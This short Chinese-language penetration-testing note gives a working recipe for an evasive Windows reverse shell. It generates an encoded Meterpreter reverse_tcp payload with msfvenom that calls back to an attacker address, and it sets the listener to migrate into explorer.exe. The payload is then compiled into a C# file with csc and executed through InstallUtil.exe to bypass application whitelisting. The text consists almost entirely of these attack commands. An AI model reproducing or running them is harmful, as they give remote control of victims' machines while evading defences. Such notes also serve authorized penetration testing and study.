	生成payload
	MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
	>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\x00' LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
	Payload粘贴到InstallUtil-Shellcode.cs中使用csc编译
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/58.png)

	C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:C:\Users\y\Desktop\shell.exe C:\Users\y\Desktop\InstallUtil-ShellCode.cs
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/59.png)

	执行
	C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\shell.exe